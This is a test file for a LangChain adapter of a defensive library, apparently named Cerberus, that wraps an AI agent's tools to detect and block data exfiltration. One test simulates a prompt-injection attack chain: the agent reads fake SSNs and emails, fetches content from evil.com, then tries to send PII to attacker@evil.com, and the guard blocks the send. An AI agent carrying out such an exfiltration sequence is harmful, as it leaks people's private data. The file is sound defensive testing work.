/**
 * Tests for the LangChain adapter (guardLangChain).
 * Uses mock tool objects with the structural LangChainTool interface.
 */

import { describe, it, expect, vi } from 'vitest';
import { guardLangChain } from '../../src/adapters/langchain.js';
import type { LangChainTool, LangChainGuardConfig } from '../../src/adapters/langchain.js';
import type { CerberusConfig } from '../../src/types/config.js';

const PRIVATE_DATA = JSON.stringify({
  records: [
    { email: 'alice@example.com', ssn: '123-45-6789', phone: '+1-555-0101' },
    { email: 'bob@example.com', ssn: '987-65-4321', phone: '+1-555-0102' },
  ],
});

const CONFIG: CerberusConfig = {
  alertMode: 'interrupt',
  threshold: 3,
  trustOverrides: [
    { toolName: 'readPrivateData', trustLevel: 'trusted' },
    { toolName: 'fetchExternalContent', trustLevel: 'untrusted' },
  ],
};

const OUTBOUND_TOOLS = ['sendOutboundReport'];

function makeTools(): LangChainTool[] {
  return [
    { name: 'readPrivateData', invoke: vi.fn().mockResolvedValue(PRIVATE_DATA) },
    { name: 'fetchExternalContent', invoke: vi.fn().mockResolvedValue('<html>injected</html>') },
    { name: 'sendOutboundReport', invoke: vi.fn().mockResolvedValue('sent') },
  ];
}

function makeConfig(overrides?: Partial<CerberusConfig>): LangChainGuardConfig {
  return {
    cerberus: { ...CONFIG, ...overrides },
    outboundTools: OUTBOUND_TOOLS,
  };
}

describe('guardLangChain', () => {
  it('should return wrapped tools with same names', () => {
    const tools = makeTools();
    const result = guardLangChain(tools, makeConfig());

    expect(result.tools).toHaveLength(3);
    expect(result.tools.map((t) => t.name)).toEqual([
      'readPrivateData',
      'fetchExternalContent',
      'sendOutboundReport',
    ]);
  });

  it('should create a session', () => {
    const result = guardLangChain(makeTools(), makeConfig());
    expect(result.session).toBeDefined();
    expect(result.session.sessionId).toBeTruthy();
  });

  it('should start with empty assessments', () => {
    const result = guardLangChain(makeTools(), makeConfig());
    expect(result.assessments).toHaveLength(0);
  });

  it('should pass args through to original tool invoke', async () => {
    const tools = makeTools();
    const result = guardLangChain(tools, makeConfig());

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    await readTool.invoke({ customerId: 'CUST-001' });

    // eslint-disable-next-line @typescript-eslint/unbound-method
    expect(tools[0].invoke).toHaveBeenCalledWith({ customerId: 'CUST-001' });
  });

  it('should accumulate assessments across tool calls', async () => {
    const result = guardLangChain(makeTools(), makeConfig());

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    const fetchTool = result.tools.find((t) => t.name === 'fetchExternalContent')!;

    await readTool.invoke({});
    await fetchTool.invoke({ url: 'https://example.com' });

    expect(result.assessments).toHaveLength(2);
    expect(result.assessments[0].vector.l1).toBe(true);
    expect(result.assessments[1].vector.l2).toBe(true);
  });

  it('should invoke onAssessment callback for each tool call', async () => {
    const onAssessment = vi.fn();
    const result = guardLangChain(makeTools(), {
      cerberus: { ...CONFIG, onAssessment },
      outboundTools: OUTBOUND_TOOLS,
    });

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    await readTool.invoke({});

    expect(onAssessment).toHaveBeenCalledTimes(1);
    expect(onAssessment).toHaveBeenCalledWith(
      // eslint-disable-next-line @typescript-eslint/no-unsafe-assignment
      expect.objectContaining({ turnId: 'turn-000', score: expect.any(Number) }),
    );
  });

  it('should detect full Lethal Trifecta and block exfiltration', async () => {
    const result = guardLangChain(makeTools(), makeConfig());

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    const fetchTool = result.tools.find((t) => t.name === 'fetchExternalContent')!;
    const sendTool = result.tools.find((t) => t.name === 'sendOutboundReport')!;

    // L1: Read private data
    const readResult = await readTool.invoke({});
    expect(readResult).toBe(PRIVATE_DATA);

    // L2: Fetch external content
    const fetchResult = await fetchTool.invoke({ url: 'https://evil.com' });
    expect(fetchResult).toBe('<html>injected</html>');

    // L3: Exfiltrate PII → blocked
    const sendResult = await sendTool.invoke({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com 123-45-6789',
    });

    expect(sendResult).toContain('[Cerberus]');
    expect(sendResult).toContain('blocked');
    expect(result.assessments).toHaveLength(3);
    expect(result.assessments[2].vector).toEqual({ l1: true, l2: true, l3: true, l4: false });
    expect(result.assessments[2].score).toBe(3);
  });

  it('should persist session across multiple tool calls', async () => {
    const result = guardLangChain(makeTools(), makeConfig());

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    await readTool.invoke({});

    expect(result.session.privilegedValues.size).toBeGreaterThan(0);
    expect(result.session.turnCounter).toBe(1);

    const fetchTool = result.tools.find((t) => t.name === 'fetchExternalContent')!;
    await fetchTool.invoke({});

    expect(result.session.turnCounter).toBe(2);
    expect(result.session.untrustedSources.size).toBeGreaterThan(0);
  });

  it('should reset session and assessments', async () => {
    const result = guardLangChain(makeTools(), makeConfig());

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    await readTool.invoke({});
    expect(result.assessments).toHaveLength(1);

    result.reset();

    expect(result.assessments).toHaveLength(0);
    expect(result.session.privilegedValues.size).toBe(0);
    expect(result.session.turnCounter).toBe(0);
  });

  it('should have destroy method that does not throw', () => {
    const result = guardLangChain(makeTools(), makeConfig());
    expect(result.destroy).toBeInstanceOf(Function);
    result.destroy();
  });

  it('should not emit signals for tools without trust overrides', async () => {
    const result = guardLangChain(makeTools(), {
      cerberus: { alertMode: 'alert' },
      outboundTools: OUTBOUND_TOOLS,
    });

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    await readTool.invoke({});

    expect(result.assessments[0].score).toBe(0);
  });

  it('should work with log alertMode (no blocking)', async () => {
    const result = guardLangChain(makeTools(), makeConfig({ alertMode: 'log', threshold: 1 }));

    const readTool = result.tools.find((t) => t.name === 'readPrivateData')!;
    const sendTool = result.tools.find((t) => t.name === 'sendOutboundReport')!;

    await readTool.invoke({});
    const sendResult = await sendTool.invoke({
      recipient: 'x@y.com',
      body: 'alice@example.com',
    });

    expect(sendResult).toBe('sent');
    expect(result.assessments[1].action).toBe('log');
  });

  it('should handle empty tools array', () => {
    const result = guardLangChain([], makeConfig());
    expect(result.tools).toHaveLength(0);
    expect(result.session).toBeDefined();
    result.destroy();
  });
});
